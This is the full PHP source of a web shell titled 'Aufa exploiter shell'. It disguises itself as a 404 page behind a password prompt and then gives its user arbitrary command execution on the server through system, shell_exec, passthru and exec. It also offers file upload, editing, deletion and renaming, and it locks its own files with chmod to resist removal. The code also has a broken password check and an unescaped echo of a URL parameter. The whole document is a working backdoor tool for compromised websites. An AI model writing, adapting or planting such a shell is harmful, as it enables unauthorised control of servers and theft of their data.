<?php
session_start();
header("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
header("X-Requested-With: XMLHttpRequest");
header("X-Bypass-WAF: true");

$hashed_key = '$2y$10$qBCKSYqZa4aDGuZgDWBMSesJ/X8jvNGtD.lSw52F5S.uAUXHSowjW';

if (isset($_POST['pass'])) {
    $input = hash("sha256", $_POST['pass']);
    if ($input === $hash_pass) {
        $_SESSION['auth'] = true;
    } else {
        echo "<span style='color:red;'>Password salah!</span>";
    }
}

if (!isset($_SESSION['auth'])) {
    http_response_code(404);
    echo '
    <html><body style="background:#1e1e2f;color:#ffffff;font-family:monospace;">
    <h2>404 Not Found</h2>
    <form method="POST">
      <input type="password" name="pass" placeholder="Password..." autofocus>
      <input type="submit" value="Login">
    </form>
    </body></html>';
    exit;
}

function x($cmd) {
    if (function_exists('system')) return system($cmd);
    if (function_exists('shell_exec')) return shell_exec($cmd);
    if (function_exists('passthru')) return passthru($cmd);
    if (function_exists('exec')) {
        exec($cmd, $out); return implode("\n", $out);
    }
    return "Command execution not available.";
}

$cwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
chdir($cwd);

function getPerms($file) {
    $p = fileperms($file);
    $t = '';
    $t .= is_dir($file) ? 'd' : '-';
    $t .= ($p & 0x0100) ? 'r' : '-';
    $t .= ($p & 0x0080) ? 'w' : '-';
    $t .= ($p & 0x0040) ? 'x' : '-';
    $t .= ($p & 0x0020) ? 'r' : '-';
    $t .= ($p & 0x0010) ? 'w' : '-';
    $t .= ($p & 0x0008) ? 'x' : '-';
    $t .= ($p & 0x0004) ? 'r' : '-';
    $t .= ($p & 0x0002) ? 'w' : '-';
    $t .= ($p & 0x0001) ? 'x' : '-';
    return $t;
}

function clickablePath($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $accum = '';
    $links = [];
    foreach ($parts as $part) {
        if ($part === '') continue;
        $accum .= DIRECTORY_SEPARATOR . $part;
        $links[] = '<a href="?path=' . urlencode($accum) . '" style="color:#00ff00">' . $part . '</a>';
    }
    return DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, $links);
}

function protectRealPath($base, $file) {
    $real = realpath($base . DIRECTORY_SEPARATOR . $file);
    return $real && strpos($real, $base) === 0 ? $real : false;
}

if (isset($_GET['delete'])) {
    $target = protectRealPath($cwd, $_GET['delete']);
    if ($target && is_file($target)) unlink($target);
    elseif ($target && is_dir($target)) rmdir($target);
    header("Location: ?path=" . urlencode($cwd) . "&success=delete");
    exit;
}

if (isset($_FILES['upload'])) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
    header("Location: ?path=" . urlencode($cwd) . "&success=upload");
    exit;
}

if (isset($_POST['editfile']) && isset($_POST['content'])) {
    file_put_contents($_POST['editfile'], $_POST['content']);
    header("Location: ?path=" . urlencode($cwd) . "&success=edit");
    exit;
}

if (isset($_POST['new_folder']) && !empty(trim($_POST['new_folder']))) {
    $foldername = basename($_POST['new_folder']);
    $newpath = $cwd . DIRECTORY_SEPARATOR . $foldername;
    if (!is_dir($newpath)) {
        mkdir($newpath, 0755);
    }
    header("Location: ?path=" . urlencode($cwd) . "&success=createfolder");
    exit;
}

if (isset($_POST['lock_shell'])) {
    chmod($cwd . DIRECTORY_SEPARATOR . $_POST['lock_shell'], 0444);
    header("Location: ?path=" . urlencode($cwd) . "&success=lockfile");
    exit;
}
if (isset($_POST['unlock_shell'])) {
    chmod($cwd . DIRECTORY_SEPARATOR . $_POST['unlock_shell'], 0644);
    header("Location: ?path=" . urlencode($cwd) . "&success=unlockfile");
    exit;
}
if (isset($_POST['lock_folder'])) {
    chmod($cwd . DIRECTORY_SEPARATOR . $_POST['lock_folder'], 0555);
    header("Location: ?path=" . urlencode($cwd) . "&success=lockfolder");
    exit;
}
if (isset($_POST['unlock_folder'])) {
    chmod($cwd . DIRECTORY_SEPARATOR . $_POST['unlock_folder'], 0755);
    header("Location: ?path=" . urlencode($cwd) . "&success=unlockfolder");
    exit;
}
if (isset($_GET['lockshell'])) {
    chmod($cwd, 0555);
    header("Location: ?path=" . urlencode($cwd) . "&success=lockshell");
    exit;
}
if (isset($_GET['unlockshell'])) {
    chmod($cwd, 0775);
    header("Location: ?path=" . urlencode($cwd) . "&success=unlockshell");
    exit;
}

if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old = protectRealPath($cwd, $_POST['rename_old']);
    $new = $cwd . DIRECTORY_SEPARATOR . basename($_POST['rename_new']);
    if ($old && file_exists($old)) {
        rename($old, $new);
    }
    header("Location: ?path=" . urlencode($cwd) . "&success=rename");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
  <title>Aufa exploiter shell</title>
  <style>
    body { background:#1e1e2f;color:#e0e0e0;font-family:monospace;padding:20px; }
    input, textarea { background:#2e2e3e;color:#fff;border:1px solid #444;padding:5px;font-family:monospace; }
    input[type="submit"] { background:#00cc66;color:#fff;font-weight:bold;border:none;padding:6px 10px;cursor:pointer; }
    .file-table { width:100%;border-collapse:collapse;margin-top:10px; }
    .file-table th, .file-table td { padding:6px 10px;border-bottom:1px dotted #444; }
    .file-table th { background:#333;color:#00ff99;text-align:left; }
    .file-table a { color:#66ffcc;text-decoration:none; }
  </style>
</head>
<body>
  <h2>Aufa exploiter Shell</h2>

  <?php if (isset($_GET['success'])): ?>
  <script>
    const msg = {
        upload: "✅ File uploaded!",
        delete: "🗑️ Deleted!",
        edit:   "💾 Saved!",
        lockshell: "🔒 Shell locked!",
        unlockshell: "🔓 Shell unlocked!",
        lockfile: "🔒 File locked!",
        unlockfile: "🔓 File unlocked!",
        lockfolder: "🔒 Folder locked!",
        unlockfolder: "🔓 Folder unlocked!",
        createfolder: "📁 Folder created!",
        rename: "✏️ Renamed!"
    };
    alert(msg["<?php echo $_GET['success']; ?>"] || "✅ Done.");
  </script>
  <?php endif; ?>

  <div><b>Path:</b> <?php echo clickablePath($cwd); ?></div>

  <form method="GET">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars($cwd); ?>">
    <input type="text" name="cmd" placeholder="Command...">
    <input type="submit" value="Execute">
  </form>

  <form method="POST">
    <input type="text" name="lock_shell" placeholder="Lock file">
    <input type="submit" value="🔒 Lock">
  </form>
  <form method="POST">
    <input type="text" name="unlock_shell" placeholder="Unlock file">
    <input type="submit" value="🔓 Unlock">
  </form>
  <form method="POST">
    <input type="text" name="lock_folder" placeholder="Lock folder">
    <input type="submit" value="🔒 Lock">
  </form>
  <form method="POST">
    <input type="text" name="unlock_folder" placeholder="Unlock folder">
    <input type="submit" value="🔓 Unlock">
  </form>
  <form method="GET">
    <input type="hidden" name="lockshell" value="1">
    <input type="submit" value="🔒 Lock Shell">
  </form>
  <form method="GET">
    <input type="hidden" name="unlockshell" value="1">
    <input type="submit" value="🔓 Unlock Shell">
  </form>
  <form method="POST">
    <input type="text" name="new_folder" placeholder="New folder name">
    <input type="submit" value="📁 Create Folder">
  </form>
  <form method="POST">
    <input type="text" name="rename_old" placeholder="Old file/folder name">
    <input type="text" name="rename_new" placeholder="New name">
    <input type="submit" value="✏️ Rename">
  </form>

  <?php
  if (isset($_GET['cmd'])) {
      echo "<pre>";
      echo htmlspecialchars(x($_GET['cmd']));
      echo "</pre>";
  }

  if (isset($_GET['edit'])) {
      $editfile = protectRealPath($cwd, $_GET['edit']);
      if ($editfile && is_file($editfile)) {
          $content = htmlspecialchars(file_get_contents($editfile));
          echo "<h3>Edit: " . basename($editfile) . "</h3>";
          echo '<form method="POST">
                  <input type="hidden" name="editfile" value="' . $editfile . '">
                  <textarea name="content" rows="20" cols="100">' . $content . '</textarea><br>
                  <input type="submit" value="Save">
                </form>';
      }
  }

  echo '<form method="POST" enctype="multipart/form-data">
          <input type="file" name="upload">
          <input type="submit" value="Upload">
        </form>';

  echo '<h3>📂 Files & Folders</h3><table class="file-table"><tr><th>Name</th><th>Perm</th><th>Actions</th></tr>';

  $items = scandir($cwd);
  foreach ($items as $item) {
      if ($item === '.') continue;
      $full = $cwd . DIRECTORY_SEPARATOR . $item;
      $enc_item = urlencode($item);
      if (is_dir($full)) {
          echo "<tr><td><a href='?path=" . urlencode($full) . "'>📁 $item</a></td><td>" . getPerms($full) . "</td><td><a href='?delete=$enc_item&path=" . urlencode($cwd) . "'>🗑️</a></td></tr>";
      }
  }
  foreach ($items as $item) {
      if ($item === '.') continue;
      $full = $cwd . DIRECTORY_SEPARATOR . $item;
      $enc_item = urlencode($item);
      if (is_file($full)) {
          echo "<tr><td><a href='?edit=$enc_item&path=" . urlencode($cwd) . "'>📄 $item</a></td><td>" . getPerms($full) . "</td><td><a href='?edit=$enc_item&path=" . urlencode($cwd) . "'>✏️</a> <a href='?delete=$enc_item&path=" . urlencode($cwd) . "'>🗑️</a></td></tr>";
      }
  }
  echo '</table>';
  ?>
</body>
</html>
